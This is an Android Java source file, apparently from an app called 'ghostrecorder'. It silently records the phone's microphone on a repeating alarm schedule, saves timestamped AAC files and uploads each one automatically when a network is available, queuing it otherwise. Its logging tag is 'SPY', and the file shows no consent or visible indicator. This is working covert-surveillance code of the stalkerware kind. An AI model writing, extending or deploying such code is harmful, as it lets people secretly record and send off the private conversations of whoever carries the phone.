package com.byteshaft.ghostrecorder;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

public class RecorderHelpers extends ContextWrapper implements
        CustomMediaRecorder.OnNewFileWrittenListener,
        CustomMediaRecorder.OnRecordingStateChangedListener {

    private static CustomMediaRecorder sRecorder;
    private PendingIntent pendingIntent;
    private AlarmManager alarmManager;
    private int mLoopCounter;
    private final int MAX_LENGTH = 20000;

    public RecorderHelpers(Context base) {
        super(base);
    }

    void startRecording(int time) {
        if (CustomMediaRecorder.isRecording()) {
            Log.i("SPY", "Recording already in progress");
            return;
        }
        sRecorder = CustomMediaRecorder.getInstance();
        sRecorder.reset();
        sRecorder.setOnNewFileWrittenListener(this);
        sRecorder.setOnRecordingStateChangedListener(this);
        sRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        sRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        sRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        sRecorder.setAudioEncodingBitRate(16000);
        sRecorder.setDuration(time);
        sRecorder.setOutputFile(Environment.getExternalStorageDirectory() + "/" + "Recordings/" + getTimeStamp() + ".aac");

        try {
            sRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
        sRecorder.start();
    }

    void startRecording(int time, int test) {
        if (time < MAX_LENGTH) {
            startRecording(time);
        } else {
            if (mLoopCounter == 0) {
                mLoopCounter = time / MAX_LENGTH;
            }
            startRecording(MAX_LENGTH);
        }
    }

     void stopRecording() {
        if (CustomMediaRecorder.isRecording()) {
            sRecorder.stop();
            sRecorder.reset();
            sRecorder.release();
            cancelAlarm();
            sRecorder = null;
        }
    }

    void createRecordingDirectoryIfNotAlreadyCreated() {
        File recordingsDirectory = new File(Environment.getExternalStorageDirectory() + "/" + "Recordings");
        if (!recordingsDirectory.exists()) {
            recordingsDirectory.mkdir();
        }
    }

    public void startAlarm(Context context, int delayTime) {
        Intent intent = new Intent("com.byteshaft.startAlarm");
        Calendar calendar = Calendar.getInstance();
        pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
        alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), delayTime * 1000 * 60, pendingIntent);
    }

    public void cancelAlarm() {
        if (alarmManager != null) {
            alarmManager.cancel(pendingIntent);
//            Toast.makeText(this, "Alarm canceled!", Toast.LENGTH_SHORT).show();
        }
    }

    private String getTimeStamp() {
        return new SimpleDateFormat("yyyyMMddhhmmss", Locale.US).format(new Date());
    }

    @Override
    public void onNewRecordingCompleted(String path) {
        ArrayList<String> arrayList = new ArrayList<>(Arrays.asList(path));
        UploadRecordingTaskHelpers  uploadRecordingTaskHelpers
                = new UploadRecordingTaskHelpers(getApplicationContext());
        if (uploadRecordingTaskHelpers.isNetworkAvailable()) {
            new UploadRecordingTask(getApplicationContext()).execute(arrayList);
        } else {
            RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper
                    (getApplicationContext());;
            recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, path);
        }
    }

    @Override
    public void onStop(int stopper) {
        switch (stopper) {
            case AppGlobals.STOPPED_AFTER_TIME:
                if (mLoopCounter > 0) {
                    System.out.println(mLoopCounter);
                    startRecording(MAX_LENGTH);
                    mLoopCounter--;
                }
                break;
            case AppGlobals.STOPPED_WITH_DIRECT_CALL:
                break;
            case AppGlobals.SERVER_DIED:
                break;
        }
    }
}
